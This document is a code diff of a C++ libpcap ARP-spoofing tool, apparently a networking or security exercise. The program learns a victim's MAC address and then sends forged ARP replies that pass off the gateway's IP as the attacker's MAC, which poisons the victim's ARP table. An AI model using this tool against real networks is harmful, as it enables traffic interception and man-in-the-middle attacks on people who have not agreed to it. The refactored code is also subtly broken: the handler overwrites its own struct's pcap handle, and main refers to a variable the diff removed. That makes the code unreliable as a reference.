@@ -18,19 +18,33 @@ void usage() {
 	printf("sample: send-arp-test wlan0\n");
 }
 
+typedef struct HandlerData {
+    pcap_t* handle;       // pcap 핸들
+    char sender_mac[18];  // MAC 주소를 저장할 버퍼
+};
+
 typedef struct {
     char* macAddress;
     char* ipAddress;
 } NetworkAddresses;
 
 void arp_reply_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
+	HandlerData* data = (HandlerData*)user_data;
+
 	PEthHdr eth_hdr = (PEthHdr)packet;
     
     // Ethernet 헤더의 type 필드를 확인하여 ARP 패킷인지 검사
-    if (eth_hdr->type() != EthHdr::Arp) return; // ARP 패킷이 아니면 리턴
+    if (eth_hdr->type() != EthHdr::Arp) return;
 
-	std::string smacString = eth_hdr->smac();
+	PArpHdr arp_hdr = (PArpHdr)(packet + sizeof(EthHdr)); // ARP 헤더 찾기
+    
+	if (arp_hdr->op() != ArpHdr::Reply) return; // ARP 응답이 아니면 반환
+
+	// IP를 확인?
+	
+	std::string smacString = std::string(eth_hdr->smac());
     std::strncpy((char*)user_data, smacString.c_str(), smacString.size() + 1); // +1 for null terminator
+	pcap_breakloop(data->handle);
 }
 
 NetworkAddresses* getUserAddresses(const char* interface) {
@@ -77,29 +91,29 @@ int main(int argc, char* argv[]) {
 	}
 
 	int i = 1;
-	while(i < argc - 1){
-		char* dev = argv[1];
-		char errbuf[PCAP_ERRBUF_SIZE];
-		pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-		if (handle == nullptr) {
-			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-			return -1;
-		}
 
-		// find my mac address and ip
-		NetworkAddresses* addresses = getUserAddresses(dev);
+	char* dev = argv[1];
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	if (handle == nullptr) {
+		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+		return -1;
+	}
+
+	// find my mac address and ip
+	NetworkAddresses* addresses = getUserAddresses(dev);
 		
-		if(addresses->macAddress == nullptr){
-			fprintf(stderr, "couldn't find your mac address\n");
-			return -1;
-		}
+	if(addresses->macAddress == nullptr){
+		fprintf(stderr, "couldn't find your mac address\n");
+		return -1;
+	}
 
-		if(addresses->ipAddress == nullptr){
-			fprintf(stderr, "couldn't find your IP address\n");
-			return -1;
-		}
+	if(addresses->ipAddress == nullptr){
+		fprintf(stderr, "couldn't find your IP address\n");
+		return -1;
+	}
 
-		// set sender and
+	while(i < argc - 1){
 		char* sender_ip = argv[i + 1]; // victim
 		char* target_ip = argv[i + 2]; // gateway
 
@@ -123,20 +137,18 @@ int main(int argc, char* argv[]) {
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			return -1;
 		}
 
-		char sender_mac[18];
-		pcap_loop(handle, -1, arp_reply_handler, (u_char*)sender_mac);
+		HandlerData data;
+    	data.handle = handle; // pcap_t* 핸들을 구조체에 저장
+    	memset(data.sender_mac, 0, sizeof(data.sender_mac)); // MAC 주소 버퍼 초기화
+
+    	pcap_loop(handle, -1, arp_reply_handler, (u_char*)&data);
 
 		// ARP table 변조
 		packet.eth_.dmac_ = Mac(sender_mac);
 		packet.eth_.smac_ = Mac(addresses->macAddress);
-		packet.eth_.type_ = htons(EthHdr::Arp);
-
-		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-		packet.arp_.pro_ = htons(EthHdr::Ip4);
-		packet.arp_.hln_ = Mac::SIZE;
-		packet.arp_.pln_ = Ip::SIZE;
 		packet.arp_.op_ = htons(ArpHdr::Reply);
 		packet.arp_.smac_ = Mac(addresses->macAddress);
 		packet.arp_.sip_ = htonl(Ip(target_ip));
@@ -146,14 +158,16 @@ int main(int argc, char* argv[]) {
 		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			return -1;
 		}
 
-		pcap_close(handle);
-
 		i += 2;
-		free(addresses->macAddress);
-		free(addresses->ipAddress);
-		free(addresses);
 	}
+
+	pcap_close(handle);
+	free(addresses->macAddress);
+	free(addresses->ipAddress);
+	free(addresses);
+
 	return 0;
 }
